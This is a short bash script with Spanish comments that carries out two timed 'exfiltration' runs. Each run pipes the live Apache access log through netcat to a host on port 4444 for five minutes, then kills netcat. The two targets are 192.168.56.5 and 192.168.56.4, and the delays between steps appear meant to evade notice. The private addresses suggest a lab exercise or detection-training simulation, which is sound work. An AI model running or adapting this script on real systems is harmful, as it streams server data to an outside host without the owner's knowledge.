#!/bin/bash

sleep 1800
echo Inicio de exfiltración 1; date
tail -f /var/log/apache2/access.log | nc 192.168.56.5 4444 &
sleep 300 #Hago exfiltración durante 5 minutos (300 segundos)
echo Fin de exfiltración 1; date
killall nc


#Segunda exfiltración
sleep 1500 #Espero otros 25 minutos
echo Inicio de exfiltración 2; date
tail -f /var/log/apache2/access.log | nc 192.168.56.4 4444 &
sleep 300 #Hago exfiltración durante 5 minutos (300 segundos)
echo Fin de exfiltración 2; date
killall nc
